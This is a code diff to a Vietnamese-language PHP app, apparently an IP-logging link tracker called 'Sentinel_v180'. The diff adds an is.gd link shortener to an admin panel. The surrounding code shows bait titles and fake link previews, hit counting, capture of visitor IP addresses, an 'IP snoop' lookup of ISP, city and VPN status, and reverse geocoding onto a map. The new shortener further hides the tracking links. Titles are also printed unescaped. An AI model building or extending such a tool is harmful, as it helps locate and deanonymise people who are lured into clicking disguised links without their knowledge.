@@ -52,7 +52,7 @@ try {
 function get_c($k) { global $db; $st = $db->prepare("SELECT value FROM settings WHERE key = ?"); $st->execute([$k]); return $st->fetchColumn(); }
 $ip_v4_serv = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
 
-// ================= 2. API XỬ LÝ (SOI IP / REV-GEO / PUSH / WEBHOOK) =================
+// ================= 2. API XỬ LÝ (SOI IP / REV-GEO / PUSH / SHORT LINK / WEBHOOK) =================
 if (isset($_GET['action'])) {
     header('Content-Type: application/json');
     if ($_GET['action'] === 'quick_check') {
@@ -61,6 +61,20 @@ if (isset($_GET['action'])) {
     if ($_GET['action'] === 'rev_geo') {
         $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
         echo @file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat={$_GET['la']}&lon={$_GET['lo']}&accept-language=vi", false, stream_context_create($opts));
+    }
+    if ($_GET['action'] === 'shorten_link') {
+        if (($_SESSION['v180_auth'] ?? '') !== $admin_pass) { http_response_code(403); echo json_encode(['ok' => false, 'error' => 'Chưa đăng nhập admin.']); exit; }
+        $in = json_decode(file_get_contents('php://input'), true) ?: [];
+        $url = trim($in['url'] ?? '');
+        if (!filter_var($url, FILTER_VALIDATE_URL) || !in_array(parse_url($url, PHP_URL_SCHEME), ['http', 'https'], true)) {
+            http_response_code(422); echo json_encode(['ok' => false, 'error' => 'URL không hợp lệ.']); exit;
+        }
+        $ctx = stream_context_create(['http' => ['timeout' => 8, 'header' => "User-Agent: Sentinel_v180 ShortLink\r\n"]]);
+        $short = trim(@file_get_contents('https://is.gd/create.php?format=simple&url=' . urlencode($url), false, $ctx));
+        if (!$short || !filter_var($short, FILTER_VALIDATE_URL)) {
+            http_response_code(502); echo json_encode(['ok' => false, 'error' => $short ?: 'Không thể tạo link rút gọn is.gd.']); exit;
+        }
+        echo json_encode(['ok' => true, 'short' => $short]);
     }
     if ($_GET['action'] === 'push') {
         $in = json_decode(file_get_contents('php://input'), true);
@@ -251,7 +265,7 @@ if (isset($_GET['admin'])) {
                 </form>
                 <div class="card p-6 shadow-2xl"><div id="vSim" class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl"><div id="vImg" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div><div class="p-4 space-y-1"><p id="vTtl" class="text-white font-black text-xs truncate">Tiêu đề mồi...</p><p id="vDsc" class="text-slate-400 text-[8px] line-clamp-2 italic normal-case">Mô tả hiển thị...</p></div></div></div>
             </div>
-            <div class="lg:col-span-2 card p-0 overflow-hidden h-fit"><table class="w-full text-left font-bold"><thead class="bg-black text-slate-500 uppercase text-[9px]"><tr><th class="p-6">Link & Meta</th><th class="p-6 text-center">Hits</th><th class="p-6 text-right">Action</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($links as $l): $u=$base_url."?v=".$l['id']; ?><tr><td class="p-6"><b><?=$l['title']?></b><br><code class="text-blue-500 text-[8px]" onclick="navigator.clipboard.writeText('<?=$u?>');alert('Copied!')"><?=$u?></code></td><td class="p-6 text-center text-xl text-white font-black"><?=$l['clicks']?></td><td class="p-6 text-right space-x-3"><button onclick='ed(<?=json_encode($l)?>)' class="text-green-500 uppercase">SỬA</button><a href="?admin&del_l=<?=$l['id']?>" onclick="return confirm('XOÁ?')" class="text-red-500 font-black">✕</a></td></tr><?php endforeach; ?></tbody></table></div>
+            <div class="lg:col-span-2 card p-0 overflow-hidden h-fit"><table class="w-full text-left font-bold"><thead class="bg-black text-slate-500 uppercase text-[9px]"><tr><th class="p-6">Link & Meta</th><th class="p-6 text-center">Hits</th><th class="p-6 text-right">Action</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($links as $l): $u=$base_url."?v=".$l['id']; $sid='short_'.preg_replace('/[^a-zA-Z0-9_-]/','_', $l['id']); ?><tr><td class="p-6"><b><?=$l['title']?></b><br><code class="text-blue-500 text-[8px]" onclick="navigator.clipboard.writeText('<?=$u?>');alert('Copied!')"><?=$u?></code><br><button type="button" onclick="makeShort('<?=$sid?>',decodeURIComponent('<?=rawurlencode($u)?>'))" class="text-cyan-400 text-[8px] uppercase mt-2">TẠO LINK IS.GD</button><code id="<?=$sid?>" class="block text-cyan-300 text-[8px] normal-case cursor-pointer" onclick="if(this.innerText)navigator.clipboard.writeText(this.innerText)"></code></td><td class="p-6 text-center text-xl text-white font-black"><?=$l['clicks']?></td><td class="p-6 text-right space-x-3"><button onclick='ed(<?=json_encode($l)?>)' class="text-green-500 uppercase">SỬA</button><a href="?admin&del_l=<?=$l['id']?>" onclick="return confirm('XOÁ?')" class="text-red-500 font-black">✕</a></td></tr><?php endforeach; ?></tbody></table></div>
         </div>
 
         <div id="t2" class="tab-content space-y-8">
@@ -332,6 +346,7 @@ if (isset($_GET['admin'])) {
         function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
         function presetSafe(type){ const data={newsletter:['ban-tin','Bản tin cập nhật','Đường dẫn chuyển hướng tới bản tin/trang nội dung của bạn.','https://www.gstatic.com/images/branding/product/2x/news_96dp.png','https://example.com'],campaign:['chien-dich','Trang chiến dịch công khai','Trang đích chính thức của chiến dịch.','https://www.gstatic.com/images/branding/product/2x/forms_96dp.png','https://example.com/campaign'],notice:['thong-bao','Thông báo chuyển hướng','Bạn sẽ được chuyển tới trang đích đã công bố.','https://www.gstatic.com/images/branding/product/2x/keep_96dp.png','https://example.com/notice']}[type]; ['safe_lid','safe_title','safe_desc','safe_img','safe_redir'].forEach((id,i)=>document.getElementById(id).value=data[i]); }
         function fillSafeLink(){ document.getElementById('fId').value=document.getElementById('safe_lid').value; document.getElementById('fTtl').value=document.getElementById('safe_title').value; document.getElementById('fDsc').value=document.getElementById('safe_desc').value; document.getElementById('fImg').value=document.getElementById('safe_img').value; document.getElementById('fRed').value=document.getElementById('safe_redir').value; upV(); st(1, document.getElementById('nb1')); }
+        async function makeShort(id,url){ const el=document.getElementById(id); el.innerText='Đang tạo link is.gd...'; try{ const res=await fetch('?action=shorten_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})}); const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định'); el.innerText=data.short; await navigator.clipboard.writeText(data.short); alert('Đã tạo và copy link is.gd!'); }catch(e){ el.innerText='Lỗi: '+e.message; } }
         function upW(){ document.getElementById('p_msg').innerText = document.getElementById('i_msg').value; document.getElementById('p_st').innerText = document.getElementById('i_st').value; document.getElementById('p_btn').innerText = document.getElementById('i_btn').value; }
         async function soi(ip){ document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black text-[9px]">TRUY QUÉT...</div>'; const res = await (await fetch('?action=quick_check&ip='+ip)).json(); if(res.status === 'success'){ document.getElementById('ip_detail').innerHTML = `<div class="text-[8px] space-y-1 uppercase italic">🏢 ISP: <b>${res.isp}</b><br>📍 VÙNG: <b>${res.city}, ${res.country}</b><br>🛡️ VPN: <b>${res.proxy ? 'YES' : 'NO'}</b></div>`; } }
         var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
